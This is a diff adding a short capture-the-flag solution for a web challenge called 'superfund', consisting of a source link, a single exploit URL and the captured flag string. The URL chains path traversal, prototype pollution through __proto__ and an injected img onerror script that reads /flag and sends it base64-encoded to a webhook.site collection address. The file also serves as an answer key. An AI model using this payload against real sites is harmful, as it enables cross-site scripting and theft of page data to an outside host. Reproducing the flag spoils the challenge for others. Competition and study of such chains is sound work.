@@ -1,0 +1,6 @@
+Source: https://github.com/zoeyg/challenges/tree/master/superfund
+
+Report
+	https://superfund.2r.is/x/..%2fadmin/index.html?debug={"__proto__":{"allowedAttrs":["src","onerror"]},"user":{"name":"<img+src=x+onerror=fetch('/flag').then(r=%26gt;r.text()).then(d=%26gt;fetch('https://webhook.site/c7c327b2-81ef-4267-880f-be92a5b57387/?flag='%2Bbtoa(d))) />"}}&id=x
+
+{"flag":"shaktictf{_3nv120nm3n741_ju571c3_}"}
